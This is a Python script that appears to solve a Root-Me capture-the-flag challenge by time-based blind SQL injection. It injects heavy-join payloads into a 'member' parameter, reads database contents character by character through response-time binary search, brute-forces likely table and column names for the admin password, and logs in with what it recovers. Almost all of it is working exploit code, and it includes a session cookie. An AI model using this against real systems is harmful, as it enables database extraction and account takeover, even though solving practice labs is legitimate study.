#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 39 - CONFIGURACIÓN CORRECTA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        # CONFIGURACIÓN CORRECTA (encontrada)
        self.baseline = 29.48
        self.threshold = 35  # <--- ¡Este es el umbral correcto!
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 OR ({cond}) OR {heavy}"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        """MODO INVERTIDO: TRUE = rápido (< threshold)"""
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload(payload, repeats=3)
        return t < self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        print(f"    Query: {query}")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedSQLInjector()

print("="*70)
print("  SQL INJECTION TIME-BASED - ROOT-ME CH40")
print("  CONFIGURACIÓN CORRECTA (umbral=35, modo invertido)")
print("="*70)

# 1. Verificar que funciona
print("\n[1] Verificando técnica...")
print(f"  1=1: {injector.is_true('1=1')} (debería ser True)")
print(f"  1=2: {injector.is_true('1=2')} (debería ser False)")

if injector.is_true('1=1') == True and injector.is_true('1=2') == False:
    print("  ✅ Técnica funciona correctamente")
else:
    print("  ❌ Técnica NO funciona")
    exit()

# 2. Extraer 'admin' con SELECT
print("\n[2] Extrayendo 'admin' con SELECT 'admin':")
admin = injector.extract_string("SELECT 'admin'", "SELECT 'admin'")
print(f"\n  Resultado: '{admin}'")
print(f"  Esperado: 'admin'")

if admin == "admin":
    print("  ✅ ¡ÉXITO! La extracción funciona")
else:
    print("  ❌ La extracción NO funciona")

# 3. Si funciona, extraer la contraseña
if admin == "admin":
    print("\n[3] Extrayendo contraseña del admin...")
    
    # Probar con diferentes tablas y columnas
    tablas = ['users', 'usuarios', 'member', 'members']
    columnas_pass = ['password', 'pass', 'pwd', 'clave', 'contrasena']
    columna_user = 'username'
    
    for tabla in tablas:
        for col in columnas_pass:
            query = f"SELECT {col} FROM {tabla} WHERE {columna_user}='admin'"
            print(f"\n  Probando: {tabla}.{col}")
            password = injector.extract_string(query, f"Contraseña de {tabla}.{col}")
            
            if password:
                print(f"\n  [+] CONTRASEÑA ENCONTRADA en {tabla}.{col}: {password}")
                
                # Verificar credenciales
                print("\n[4] Verificando credenciales...")
                data = {"username": "admin", "password": password}
                r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
                
                if "Authentification error" not in r.text:
                    print("  ✅ ¡CREDENCIALES CORRECTAS!")
                    print(f"  Usuario: admin")
                    print(f"  Contraseña: {password}")
                    exit(0)
                else:
                    print("  ❌ Las credenciales no funcionan con esta contraseña")
